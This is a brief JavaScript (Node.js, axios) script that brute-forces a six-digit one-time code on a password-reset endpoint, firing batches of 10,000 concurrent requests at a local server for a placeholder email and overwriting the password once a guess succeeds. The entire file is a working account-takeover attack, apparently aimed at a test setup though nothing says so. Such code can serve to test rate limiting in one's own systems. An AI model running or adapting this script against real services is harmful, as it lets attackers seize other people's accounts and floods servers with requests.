const axios = require('axios');

// Function to try resetting the password with a guessed OTP
async function tryOtp(email, otp) {
    try {
        const response = await axios.post('http://localhost:3000/reset-password', {
            email: email,
            otp: otp,
            newPassword: 'newPassword123'
        });
        console.log(`Success with OTP: ${otp}`, response.data);
        return true; // Return true if the OTP is correct
    } catch (error) {
        return false; // Return false if the OTP is wrong
    }
}

// Optimized brute-force OTP function with continuous request sending
async function bruteForceOtp(email, concurrency = 10000) {
    let otp = 100000;
    const maxOtp = 999999;

    const sendRequests = async () => {
        const batch = [];
        for (let i = 0; i < concurrency && otp <= maxOtp; i++, otp++) {
            batch.push(tryOtp(email, otp.toString()));
        }
        return Promise.all(batch);
    };

    let results = [];
    while (otp <= maxOtp) {
        // Start sending the next batch while the current one is being processed
        const newResults = await sendRequests();
        results = results.concat(newResults);

        if (newResults.some(isSuccess => isSuccess)) {
            console.log('Correct OTP found, stopping further attempts.');
            break;
        }
    }
}

// Start brute-forcing for the target email with higher concurrency
bruteForceOtp('test@example.com');